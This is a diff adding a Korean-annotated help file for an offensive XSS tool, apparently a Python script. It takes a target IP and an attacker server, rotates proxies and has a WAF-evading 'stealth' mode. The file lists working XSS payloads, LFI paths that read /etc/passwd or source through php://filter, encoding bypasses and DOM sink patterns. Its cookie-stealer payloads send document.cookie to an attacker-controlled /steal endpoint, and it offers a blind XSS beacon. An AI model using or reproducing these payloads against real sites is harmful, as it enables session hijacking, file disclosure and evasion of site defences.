@@ -1,0 +1,94 @@
+실행 명령어
+python3 <파일이름>.py <타겟 서버> <공격자 서버> <옵션>
+
+e.g.) python3 xss_tool3_edit.py http://13.125.80.75 http://attacker.com --proxy --stealth
+--proxy : 프록시 활성화
+--stealth : 스텔스 모드 활성화 (WAF 차단 우회)
+
+
+Available Commands:
+
+[1] Basic XSS Test - Test common XSS payloads
+기본 스크립트 삽입 테스트
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+" onmouseover="alert(1)" x="
+' onmouseover='alert(1)' x='
+javascript:alert(1)
+<iframe src=javascript:alert(1)>
+
+[2] GET Parameter Scan - Find XSS in GET parameters  
+GET 메소드의 파라미터에 <img src=x onerror=alert(1)>와 같은 XSS payload 테스트
+
+[3] File.php Exploitation - Test file.php vulnerabilities
+file.php 페이지의 LFI 취약점 테스트
+../../../etc/passwd
+....//....//....//etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://input
+/var/log/apache2/access.log
+
+[4] WAF Detection - Detect WAF patterns
+WAF 레벨에서의 문자열 차단 여부 확인
+normal text
+<script>
+alert(1)
+onerror=
+javascript:
+<img
+onmouseover
+../../../
+SELECT * FROM
+<?php
+
+[5] Advanced Encoding Bypass - Try encoded payloads
+인코딩 차단 여부 확인
+HTML Entity: &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+URL Encode: %61%6c%65%72%74%28%31%29
+Unicode: \\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029
+Base64: YWxlcnQoMSk=
+Hex: 0x616c6572742831290
+
+[6] Cookie Stealer - Deploy cookie stealing payload
+쿠키 탈취
+f'<img src=x onerror="new Image().src=\'{self.attacker_server}/steal?c=\'+document.cookie">'
+f'<script>location=\'{self.attacker_server}/steal?c=\'+document.cookie</script>'
+f'" onmouseover="location=\'{self.attacker_server}/steal?c=\'+document.cookie" x="'
+f'<script>fetch(\'{self.attacker_server}/steal\',{{method:\'POST\',body:document.cookie}})</script>'
+
+[7] DOM XSS Finder - Find DOM-based XSS
+DOM Based XSS 취약점 찾기
+(r'location\.hash', 'location.hash usage')
+(r'document\.write', 'document.write usage')
+(r'innerHTML\s*=', 'innerHTML assignment')
+(r'eval\(', 'eval() function')
+(r'setTimeout\(', 'setTimeout with string')
+(r'\.html\(', 'jQuery html() method')
+(r'\.append\(', 'jQuery append() method')
+
+[8] CSRF PoC Generator - 사용 X
+
+{Fore.YELLOW}[9]{Style.RESET_ALL} Custom Payload             - Test your own payload
+사용자가 직접 입력한 페이로드를 게시글로 작성
+
+{Fore.YELLOW}[10]{Style.RESET_ALL} Reflected XSS Scanner     - Scan for reflected XSS
+Reflected XSS 취약점 스캐너
+
+{Fore.YELLOW}[11]{Style.RESET_ALL} Blind XSS Payload         - Deploy blind XSS beacon
+다양한 Blind XSS 페이로드와 엔드포인트 테스트
+
+{Fore.YELLOW}[12]{Style.RESET_ALL} Generate Report           - Create attack report
+성공한 페이로드에 관한 보고서 생성
+
+{Fore.MAGENTA}[P]{Style.RESET_ALL} Rotate Proxy               - Switch to next proxy
+새로운 프록시 서버로 전환
+
+{Fore.MAGENTA}[S]{Style.RESET_ALL} Toggle Stealth Mode        - Current: {'ON' if self.stealth_mode else 'OFF'}
+스텔스 모드 온, 오프 전환
+
+{Fore.MAGENTA}[H]{Style.RESET_ALL} Help                      - Show detailed help
+도움말
+
+{Fore.RED}[Q]{Style.RESET_ALL} Quit                      - Exit the tool
+프로그램 종료
